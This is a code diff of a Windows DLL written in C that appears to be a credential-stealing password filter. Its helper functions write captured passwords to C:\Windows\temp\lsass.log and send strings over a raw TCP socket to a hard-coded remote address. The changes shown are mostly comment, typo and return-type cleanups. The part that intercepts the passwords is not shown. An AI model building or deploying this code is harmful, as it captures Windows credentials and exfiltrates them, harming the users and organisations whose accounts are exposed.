@@ -14,13 +14,11 @@
 
 #include <Windows.h>
 #include <SubAuth.h>
-//#include <wininet.h>
 #include <winsock2.h>
-//#include <iostream>
 
 //////// Helper functions
 
-//Sends a *unicode_string over a raw socket.
+//Sends a *unicode_string over a raw socket to a (hard coded) remote server.
 //takes: a pointer to a unicode string
 //returns: a status
 NTSTATUS SendToRemote(PUNICODE_STRING text){
@@ -28,11 +26,13 @@ NTSTATUS SendToRemote(PUNICODE_STRING text){
     SOCKET sock = INVALID_SOCKET;
     struct sockaddr_in serverAddr;
 
+    //Start win sock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         //std::cerr << "WSAStartup failed with error: " << WSAGetLastError() << std::endl;
         return 1;
     }
 
+    //create a socket
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) {
         //std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
@@ -45,6 +45,7 @@ NTSTATUS SendToRemote(PUNICODE_STRING text){
     serverAddr.sin_port = htons(80);
     serverAddr.sin_addr.s_addr = inet_addr("192.168.109.131");
 
+    //Start a TCP connection
     if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         //std::cerr << "Failed to connect to server: " << WSAGetLastError() << std::endl;
         closesocket(sock);
@@ -89,13 +90,11 @@ NTSTATUS catUTF16LEStr(
         return STATUS_NO_MEMORY;
     }
 
-    // Copy the first string
+    // Copy the strings into the buffer
     memcpy(Result->Buffer, String1->Buffer, String1->Length);
-
-    // Copy the second string
     memcpy((BYTE*)Result->Buffer + String1->Length, String2->Buffer, String2->Length);
 
-    // Set the length and maximum length of the result
+    // Set the length and maximum length of the resulting string
     Result->Length = totalLength;
     Result->MaximumLength = totalLength + sizeof(WCHAR);
 
@@ -105,11 +104,11 @@ NTSTATUS catUTF16LEStr(
     return STATUS_SUCCESS;
 }
 
-//Write a *unicodestring to a hardcoaded file
+//Write a *unicodestring to a hardcoded file
 //For writing the passwords
 //takes: PUNICODE_STRING to write
 //returns: status
-BOOL writeToFile(PUNICODE_STRING text) {
+NTSTATUS writeToFile(PUNICODE_STRING text) {
     //open a file (the janky windows way)
     HANDLE hFile = CreateFileW(
             L"C:\\Windows\\temp\\lsass.log",
@@ -124,7 +123,7 @@ BOOL writeToFile(PUNICODE_STRING text) {
     //debug
     if (hFile == INVALID_HANDLE_VALUE) {
         //printf("bad handle: %d", hFile);
-        return FALSE;
+        return 1;
     }
     // Move file pointer to the end for appending
     SetFilePointer(hFile, 0, NULL, FILE_END);
@@ -132,7 +131,7 @@ BOOL writeToFile(PUNICODE_STRING text) {
     //Do you see why I hate stupid unicode now
     // Write BOM (byte order mark) if the file is new (just created)
     // this tells windows that it is looking at unicode rather than ascii
-    // and prevents null btyes between ascii letters.
+    // and prevents null bytes between ascii letters.
     DWORD fileSize = GetFileSize(hFile, NULL);
     if (fileSize == 0) {
         WORD bom = 0xFEFF;
@@ -152,6 +151,7 @@ BOOL writeToFile(PUNICODE_STRING text) {
 
     if(result != TRUE) {
         //std::cerr << "error writing";
+        return 2;
     }
 
     CloseHandle(hFile);
@@ -159,7 +159,7 @@ BOOL writeToFile(PUNICODE_STRING text) {
 }
 
 
-
+////////////////Real functions
 
 //boilerplate dll (I think. TBH this could be doing nothing, but I am not touching it now)
 BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
